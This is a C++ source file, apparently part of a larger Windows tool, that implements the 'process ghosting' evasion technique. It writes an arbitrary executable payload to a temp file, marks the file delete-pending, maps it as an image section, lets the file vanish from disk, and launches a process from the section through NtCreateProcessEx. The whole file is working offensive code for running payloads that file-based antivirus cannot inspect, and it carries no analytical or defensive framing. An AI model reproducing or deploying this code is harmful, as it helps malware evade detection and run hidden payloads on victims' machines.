#include "stdafx.h"
#include "process_ghost.h"
#include "logger.h"
#include <string>

namespace ProcessGhost {

namespace {

// NT API typedefs for process ghosting
typedef NTSTATUS (NTAPI* NtCreateFile_t)(
    PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
    ULONG ShareAccess, ULONG CreateDisposition,
    ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

typedef NTSTATUS (NTAPI* NtWriteFile_t)(
    HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length,
    PLARGE_INTEGER ByteOffset, PULONG Key);

typedef NTSTATUS (NTAPI* NtSetInformationFile_t)(
    HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation, ULONG Length,
    ULONG FileInformationClass);

typedef NTSTATUS (NTAPI* NtCreateSection_t)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS (NTAPI* NtCreateProcessEx_t)(
    PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess,
    ULONG Flags, HANDLE SectionHandle,
    HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);

// FileDispositionInformation class = 13
constexpr ULONG FileDispositionInformation = 13;

struct FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
};

// Resolve an NT function by name
template<typename T>
T ResolveNtFunc(const char* name) {
    static HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    return hNtdll ? (T)GetProcAddress(hNtdll, name) : nullptr;
}

} // namespace

HANDLE CreateGhostedProcess(const void* pePayload, size_t payloadSize) {
    if (!pePayload || payloadSize == 0) return NULL;

    // Resolve NT functions
    auto pNtCreateFile = ResolveNtFunc<NtCreateFile_t>("NtCreateFile");
    auto pNtWriteFile = ResolveNtFunc<NtWriteFile_t>("NtWriteFile");
    auto pNtSetInfoFile = ResolveNtFunc<NtSetInformationFile_t>("NtSetInformationFile");
    auto pNtCreateSection = ResolveNtFunc<NtCreateSection_t>("NtCreateSection");
    auto pNtCreateProcessEx = ResolveNtFunc<NtCreateProcessEx_t>("NtCreateProcessEx");

    if (!pNtCreateFile || !pNtWriteFile || !pNtSetInfoFile || 
        !pNtCreateSection || !pNtCreateProcessEx) {
        LOG(L"ProcessGhost: Failed to resolve required NT functions");
        return NULL;
    }

    // Step 1: Create a temp file
    WCHAR tempPath[MAX_PATH] = {};
    WCHAR tempFile[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempPath);
    GetTempFileNameW(tempPath, L"wh", 0, tempFile);

    // Open the file with delete access
    HANDLE hFile = CreateFileW(tempFile, GENERIC_READ | GENERIC_WRITE | DELETE,
                               0, nullptr, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG(L"ProcessGhost: Failed to create temp file: %u", GetLastError());
        return NULL;
    }

    // Step 2: Write the payload
    DWORD bytesWritten = 0;
    if (!WriteFile(hFile, pePayload, (DWORD)payloadSize, &bytesWritten, nullptr) ||
        bytesWritten != payloadSize) {
        LOG(L"ProcessGhost: Failed to write payload: %u", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    // Step 3: Put the file in delete-pending state
    IO_STATUS_BLOCK ioStatus = {};
    FILE_DISPOSITION_INFORMATION dispInfo = { TRUE };
    NTSTATUS status = pNtSetInfoFile(hFile, &ioStatus, &dispInfo,
                                      sizeof(dispInfo), FileDispositionInformation);
    if (status < 0) {
        LOG(L"ProcessGhost: NtSetInformationFile (delete-pending) failed: 0x%08X", status);
        CloseHandle(hFile);
        return NULL;
    }

    VERBOSE(L"ProcessGhost: File in delete-pending state: %s", tempFile);

    // Step 4: Create an image section from the delete-pending file
    HANDLE hSection = NULL;
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr,
                               PAGE_READONLY, SEC_IMAGE, hFile);
    if (status < 0 || !hSection) {
        LOG(L"ProcessGhost: NtCreateSection failed: 0x%08X", status);
        CloseHandle(hFile);
        return NULL;
    }

    // Step 5: Close the file handle — this completes the deletion
    // The file is now gone from disk, but the section still references its pages
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    VERBOSE(L"ProcessGhost: File deleted, section still valid");

    // Step 6: Create a process from the ghosted section
    HANDLE hProcess = NULL;
    status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, nullptr,
                                 GetCurrentProcess(), 0, hSection,
                                 NULL, NULL, 0);

    CloseHandle(hSection);

    if (status < 0 || !hProcess) {
        LOG(L"ProcessGhost: NtCreateProcessEx failed: 0x%08X", status);
        return NULL;
    }

    VERBOSE(L"ProcessGhost: Successfully created ghosted process (handle=%p)", hProcess);
    return hProcess;
}

} // namespace ProcessGhost
